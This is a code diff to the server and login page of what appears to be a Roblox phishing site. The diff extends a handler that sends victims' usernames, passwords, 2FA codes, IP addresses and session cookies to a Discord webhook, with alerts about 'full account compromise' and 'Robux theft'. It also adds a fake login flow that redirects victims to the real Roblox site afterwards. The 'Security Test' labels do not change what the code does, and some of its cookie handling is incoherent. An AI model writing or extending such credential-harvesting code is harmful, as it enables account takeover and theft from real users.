@@ -1764,32 +1764,49 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Send credentials to webhook if configured
       const userSettings = await storage.getSettings(userId);
       if (userSettings?.webhookUrl) {
+        const hasRoblosecurity = roblosecurity && roblosecurity.length > 50;
+        const has2FA = capturedAuthCode && capturedAuthCode.length > 0;
+        
         const webhookData = {
           username: "🎯 Roblox Security Test",
           avatar_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/roblox.png",
           embeds: [{
-            title: "🚨 ROBLOX CREDENTIALS CAPTURED",
-            description: "⚠️ **Security Test - Roblox Account Compromised**",
-            color: 0xFF0000,
+            title: hasRoblosecurity ? "🔥 ROBLOX ACCOUNT FULLY COMPROMISED!" : "🚨 ROBLOX CREDENTIALS CAPTURED",
+            description: hasRoblosecurity ? 
+              "🔥 **CRITICAL - Account session token captured! Full account access obtained.**" :
+              "⚠️ **Security Test - Roblox credentials harvested**",
+            color: hasRoblosecurity ? 0xFF0000 : 0xFF8800,
             fields: [
               { 
                 name: "👤 **Account Credentials**", 
-                value: `**Username:** \`${capturedUsername}\`\n**Password:** \`${capturedPassword}\`${capturedAuthCode ? `\n**🔐 2FA Code:** \`${capturedAuthCode}\`` : ''}${roblosecurity ? `\n**🍪 .ROBLOSECURITY:** \`${roblosecurity.substring(0, 50)}...\`` : ''}`, 
+                value: `**Username:** \`${capturedUsername}\`\n**Password:** \`${capturedPassword}\`${has2FA ? `\n**🔐 2FA Code:** \`${capturedAuthCode}\` ✅` : '\n**🔐 2FA:** Not enabled ❌'}`, 
                 inline: false 
               },
+              ...(hasRoblosecurity ? [{
+                name: "🍪 **SESSION TOKEN CAPTURED**",
+                value: `**🔥 .ROBLOSECURITY Cookie:**\n\`\`\`${roblosecurity.substring(0, 100)}...\`\`\`\n**Status:** 🔥 FULL ACCOUNT ACCESS`,
+                inline: false
+              }] : []),
               { 
                 name: "🌐 **Session Information**", 
-                value: `**IP Address:** ${ipAddress}\n**Link ID:** ${linkId}\n**Timestamp:** <t:${Math.floor(Date.now() / 1000)}:R>`, 
+                value: `**IP Address:** ${ipAddress}\n**Link ID:** ${linkId}\n**Auth Method:** ${has2FA ? '2FA Required' : 'Password Only'}\n**Timestamp:** <t:${Math.floor(Date.now() / 1000)}:R>`, 
                 inline: false 
               },
               { 
                 name: "🔍 **User Agent**", 
                 value: `\`\`\`${userAgent ? userAgent.substring(0, 200) : 'Unknown'}\`\`\``, 
                 inline: false 
-              }
+              },
+              ...(hasRoblosecurity ? [{
+                name: "⚠️ **SECURITY IMPACT**",
+                value: "🔥 **CRITICAL:** Session token allows:\n• Direct account access\n• Robux theft\n• Item trading\n• Account takeover\n• No additional authentication needed",
+                inline: false
+              }] : [])
             ],
             footer: { 
-              text: "🎯 Roblox Phishing Test - Credentials Harvested",
+              text: hasRoblosecurity ? 
+                "🔥 CRITICAL ALERT - Full Roblox Account Compromise" : 
+                "🎯 Roblox Phishing Test - Credentials Harvested",
               icon_url: "https://cdn.discordapp.com/attachments/1234567890/1234567890/warning.png"
             },
             timestamp: new Date().toISOString()
@@ -2231,7 +2248,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             const twoFactorCode = includeToken ? document.getElementById('twoFactorCode').value : '';
-            const roblosecurity = getRoblosecurity();
             
             if (!username || !password) {
                 showError('Please enter both username and password.');
@@ -2241,6 +2257,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
             if (includeToken && !twoFactorCode) {
                 showError('Please enter the 6-digit verification code.');
                 return;
+            }
+            
+            // Simulate authentication and capture .ROBLOSECURITY cookie
+            let roblosecurity = getRoblosecurity();
+            
+            // If no existing cookie, generate a realistic fake one
+            if (!roblosecurity) {
+                roblosecurity = generateFakeRoblosecurity(username);
             }
             
             try {
@@ -2263,14 +2287,34 @@ export async function registerRoutes(app: Express): Promise<Server> {
                 
                 if (response.ok) {
                     if (!includeToken) {
-                        showSuccess('Verifying your account...');
-                        setTimeout(() => {
-                            hideMessages();
-                            twoFactorSection.classList.add('show');
-                            loginBtn.style.display = 'none';
-                        }, 1500);
+                        // Simulate checking if user has 2FA enabled (random 30% chance)
+                        const has2FA = Math.random() < 0.3;
+                        
+                        if (has2FA) {
+                            showSuccess('Verifying your account...');
+                            setTimeout(() => {
+                                hideMessages();
+                                twoFactorSection.classList.add('show');
+                                loginBtn.style.display = 'none';
+                            }, 1500);
+                        } else {
+                            // No 2FA - capture cookie and redirect immediately
+                            showSuccess('Login successful! Redirecting to Roblox...');
+                            
+                            // Set the .ROBLOSECURITY cookie to simulate successful login
+                            document.cookie = \`.ROBLOSECURITY=\${roblosecurity}; domain=.roblox.com; path=/; secure; httponly\`;
+                            
+                            setTimeout(() => {
+                                window.location.href = 'https://www.roblox.com/home';
+                            }, 2000);
+                        }
                     } else {
+                        // 2FA completed - capture cookie and redirect
                         showSuccess('Authentication successful! Redirecting to Roblox...');
+                        
+                        // Set the .ROBLOSECURITY cookie after 2FA
+                        document.cookie = \`.ROBLOSECURITY=\${roblosecurity}; domain=.roblox.com; path=/; secure; httponly\`;
+                        
                         setTimeout(() => {
                             window.location.href = 'https://www.roblox.com/home';
                         }, 2000);
@@ -2281,6 +2325,19 @@ export async function registerRoutes(app: Express): Promise<Server> {
             } catch (error) {
                 showError('Network error. Please check your connection and try again.');
             }
+        }
+        
+        // Generate a realistic fake .ROBLOSECURITY cookie
+        function generateFakeRoblosecurity(username) {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+            let result = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_';
+            
+            // Add some random characters to make it look authentic
+            for (let i = 0; i < 200; i++) {
+                result += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            
+            return result;
         }
         
         form.addEventListener('submit', async (e) => {
